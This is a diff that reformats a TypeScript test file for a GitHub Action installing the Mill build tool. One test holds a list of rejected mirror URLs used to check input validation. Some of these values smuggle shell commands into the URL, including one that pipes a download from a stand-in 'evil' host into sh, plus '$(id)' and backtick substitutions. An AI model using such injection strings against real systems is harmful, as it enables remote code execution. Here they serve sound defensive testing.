@@ -1,7 +1,5 @@
 import {execFileSync} from 'node:child_process'
-import {
-  existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync,
-} from 'node:fs'
+import {existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync} from 'node:fs'
 import {readFile, writeFile} from 'node:fs/promises'
 import * as os from 'node:os'
 import {join} from 'node:path'
@@ -10,19 +8,15 @@ import * as core from '@actions/core'
 import * as exec from '@actions/exec'
 import * as io from '@actions/io'
 import * as tc from '@actions/tool-cache'
-import {
-  beforeEach, expect, test, vi,
-} from 'vitest'
-import {
-  getBundledMillPath, install, remove, withMavenRepository,
-} from './mill.js'
+import {beforeEach, expect, test, vi} from 'vitest'
+import {getBundledMillPath, install, remove, withMavenRepository} from './mill.js'
 
 vi.mock('node:fs/promises', () => ({
   readFile: vi.fn(),
   writeFile: vi.fn(),
 }))
 vi.mock('node:os', async importOriginal => ({
-  ...await importOriginal<typeof os>(),
+  ...(await importOriginal<typeof os>()),
   homedir: vi.fn(),
 }))
 vi.mock('@actions/core')
@@ -34,7 +28,7 @@ const maven = 'https://repo1.maven.org/maven2'
 
 /** Defaults to a runner with no mill-repository override. */
 function setup({millRepository = ''}: {millRepository?: string} = {}) {
-  vi.mocked(core.getInput).mockImplementation(name => name === 'mill-repository' ? millRepository : '')
+  vi.mocked(core.getInput).mockImplementation(name => (name === 'mill-repository' ? millRepository : ''))
   vi.mocked(os.homedir).mockReturnValue('/home/runner')
 }
 
@@ -68,7 +62,7 @@ test('`withMavenRepository()` → rejects repositories with shell metacharacters
     'https://mirror.example.com/"; curl evil | sh; "',
     'https://mirror.example.com/$(id)',
     'https://mirror.example.com/`id`',
-    'https://mirror.example.com/\'',
+    "https://mirror.example.com/'",
     'https://mirror.example.com/a b',
     'https://mirror.example.com/a\nb',
     'ftp://mirror.example.com/maven',
@@ -122,7 +116,8 @@ test('`install()` → rewrites the wrapper when `mill-repository` is a mirror', 
   await install()
 
   expect(vi.mocked(writeFile).mock.calls[0]).toStrictEqual([
-    '/home/runner/bin/mill', 'URL="https://mirror.example.com/maven/com/lihaoyi/mill-dist"',
+    '/home/runner/bin/mill',
+    'URL="https://mirror.example.com/maven/com/lihaoyi/mill-dist"',
   ])
 })
 
@@ -224,7 +219,10 @@ test('embedded wrapper dry run → downloads from the mirror after the rewrite',
   const dir = mkdtempSync(join(os.tmpdir(), 'mill-wrapper-'))
 
   try {
-    const rewritten = withMavenRepository(readFileSync(getBundledMillPath(), 'utf8'), 'https://mirror.example.com/maven')
+    const rewritten = withMavenRepository(
+      readFileSync(getBundledMillPath(), 'utf8'),
+      'https://mirror.example.com/maven',
+    )
     const script = join(dir, 'mill')
     writeFileSync(script, rewritten)
 
